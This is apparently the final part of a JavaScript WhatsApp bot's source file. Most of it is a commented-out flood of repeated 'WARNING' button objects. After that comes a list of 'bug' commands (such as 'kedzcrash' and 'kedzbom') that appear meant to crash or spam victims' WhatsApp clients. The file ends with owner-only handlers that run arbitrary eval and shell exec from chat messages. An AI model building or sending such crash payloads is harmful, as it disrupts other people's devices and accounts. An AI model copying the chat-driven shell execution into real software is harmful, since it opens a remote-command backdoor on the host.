// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
// { quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
// { quoted: lep }
// ]})
// }}
break
// INI BUG KE NOMER //
// case '🐣':
// case '🥶':
// case '🥵':
// case '🤠':
// case '👻':
// case '🤓':
// case '😴':
// case 'kursihijau':
// case 'alokhamil':
// case 'bantengmerah':
// case 'santet':
// case 'kedzbug':
// case 'kedztroli':
// case 'kedzbom':
// case 'kedzmental':
// case 'kedzcrash':
// case 'kedzbom':
// case 'kedzganas':
// case 'kedzbutton':
// case 'kedztrava':
// case 'kedzkatalog':
// case 'kedzbugmex':
// case 'kedzsuhu':
// case 'kedzbugjago':
// case 'kedzbugdarkness':
// case 'kedzbugwaifu':
// case 'kedzbugbully':
// case 'kedzbugslebew':
// case 'kedzneko':
// case 'kedzhentai':
 if (!itsMerixx) return rixxbotwhatsapp.reply(`Belum Di addakses`)
// await sleep(ms(waktu))
break

break
default:
}
if (budy.startsWith('=>')) {
if (!itsMerixx) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return rixxbotwhatsapp.reply(bang)
}
try {
rixxbotwhatsapp.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
rixxbotwhatsapp.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMerixx) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await rixxbotwhatsapp.reply(evaled)
} catch (err) {
rixxbotwhatsapp.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMerixx) return
try {
return rixxbotwhatsapp.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMerixx) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return rixxbotwhatsapp.reply(`${err}`)
if (stdout) {
rixxbotwhatsapp.reply(stdout)
}
})
}
} catch (err) {
rixxbotwhatsapp.reply(util.format(err))
}
} 